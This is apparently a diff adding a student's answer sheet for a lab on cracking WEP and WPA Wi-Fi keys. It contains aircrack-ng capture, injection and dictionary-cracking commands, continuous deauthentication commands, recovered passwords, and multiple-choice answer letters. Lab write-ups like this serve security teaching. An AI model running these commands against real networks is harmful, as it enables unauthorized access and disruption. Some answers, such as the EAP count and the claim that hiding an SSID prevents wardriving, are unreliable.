@@ -1,0 +1,132 @@
+Lab2 Solutions
+
+Q1
+1) Target network EESID: TargetNetwork1
+
+2) Commands used to crack the WEP key:
+$ airmon-ng start wlan0
+$ airmon-ng check kill
+$ iwconfig
+$ airodump-ng wlan0mon
+$ airodump-ng -c 2 --bssid B4:75:0E:35:58:60 -w Desktop/file1 wlan0mon
+$ aireplay-ng -1 0 -e TargetNetwork1 -h 00:C0:CA:7F:00:37 -a B4:75:0E:35:58:60 wlan0mon
+$ aireplay-ng -3 -b B4:75:0E:35:58:60 - h  00:C0:CA:7F:00:37 wlan0mon
+$ aircrack-ng -b B4:75:0E:35:58:60 ~/Desktop/file1-01.cap
+
+3) Commands used to crack the WPA key:
+$ airodump-ng -c 6 --bssid B4:75:0E:35:52:7E -w ~/Desktop/wpafile1 wlan0mon
+$ aircrack-ng -w /usr/share/wordlists/rockyou.txt -b B4:75:0E:35:52:7E ~/Desktop/*.cap
+
+4) WEP key: 01:23:45:67:89, WPA key: superman
+* NB: The actual password used by the WEP AP is just 0123456789
+
+
+
+Q2
+In WEP, the IVs generated from the AP as reused within a short period of time. The IVs only 24 bits added to the key, because the IVs is short, it guarantees that those streams will repeat after a relatively short time on a busy network, if we get the IVs, we can retrace and decrypt the key.
+
+
+Q3
+Each ARP packet repeated by the access point has a new IVs. These new IVs allow us to determine the WEP key. By this way, we can gain more IVs, when we have suitable numbers of IVs, make cracking the WEP keys process faster.
+
+
+Q4
+b,c,d
+
+
+Q5
+a,c
+
+
+Q6
+a
+
+
+Q7
+b
+
+
+Q8
+PWR is Signal strength when an AP or a station has a high signal strength so it's really a good target to crack, as the signal gets higher you get closer to the AP or the station.
+
+
+
+Q9
+We will send deauthentication packets.
+
+The command we would use is: 
+	aireplay-ng -0 0 -a 50:C7:BF:DC:4C:E8 wlan0mon
+
+Parameter definitions:
+	-0 means deauthentication.
+ 	0 is the number of deauths to send 0 means send them continuously.
+	-a 50:C7:BF:DC:4C:E8 is the MAC address of the AP.
+	wlan0mon is the interface name.
+
+
+
+
+Q10
+The command we would use is:
+	aireplay-ng -0 0 -a 50:C7:BF:DC:4C:E8 -c E0:B5:2D:EA:18:A7 wlan0mon
+
+Parameter definitions:
+	-0 means deauthentication.
+ 	0 is the number of deauths to send 0 means send them continuously.
+	-a 50:C7:BF:DC:4C:E8 is the MAC address of the AP.
+	-c E0:B5:2D:EA:18:A7 is the MAC address of the client to deauthenticate
+	wlan0mon is the interface name.
+
+
+Q11
+With a brute force dictionary attack, the attacker checks all possible passwords until the right passphrase has been discovered. The attacker has to wait for a user to login to the AP in order to capture the authentication handshaking process and then conduct a brute-force search for the password.  
+
+One way to possibly speed up the attack would be to leverage GPUs as they are faster when it comes to computing the hash and comparing keys.
+
+
+Q12
+Extensible Authentication Protocol (EAP) is an authentication framework, using in wireless network connection that expands on authentication methods used by the Point-to-Point Protocol.  There are 6 types of EAPs are supported by WPA/WPA2, they are EAP-TLS, EAP-TTLS/MSCHAPv2, PEAPv0/EAP-MSCHAPv2, PEAPv1/EAP-GTC and EAP-SIM.
+
+
+
+Q13
+WiFi Wardriving is the process of searching and mapping WiFi networks in different physical locations. This is usually done by searching for networks in a moving vehicle and associating them when a coordinates using a GPS device.  
+
+Tools used for wardriving:
+1) iStumbler
+2) WiFi-Where
+3) Kismet
+4) NetStumbler
+
+Not broadcasting your SSID can prevent others from discovering your network, thus preventing wardriving.
+
+
+
+Q14
+1. Turning monitoring mode on the wireless interface you're using to hack the WEP-based AP. 
+2. Check if your wireless device is within reasonable distance to the AP and inject packets to it.
+3. Capture the IVs (using airodump-ng)
+4. Perform fake authentication on the target AP using aireplay-ng
+5. Listen for ARP requests and reinject them back into the network
+6.  After capturing a bunch of IVs, run aircrack-ng to obtain the password. If we have enough IVs, the key correct will be displayed in hex.
+
+
+Q15
+WPA supports TKIP (Temporal Key Integrity Protocol) for encryption, whereas WPA2 supports both TKIP and AES (Advanced Encryption Standard) for encryption. In theory, WPA2 is extremely difficult to hack, whereas WPA is hackable.
+
+If I were to set up my own WiFI at home, I'd use WPA2 as it uses AES, even though it requires more processing power and cause a slight reduction in network performance.
+
+
+
+Q16
+a
+
+
+Q17
+The more characters a key contains, the longer it will take to crack as it requires more combinations to be generated and compared to the original key. This is assuming we're not using a password list and the correct key is not in that list. 
+
+During the lab, we used a password list that happen to contain the correct key, which is why it didn't take too long to crack. However, if we didn't have the password list and had to generate combinations on the fly, it would have taken much longer to crack. For example, it would take more than a year on a standard desktop computer to crack a password that's 11 characters long. It would take way longer to crack a password that 20 characters long, hence we can say it's more secure.
+
+
+Q18
+b
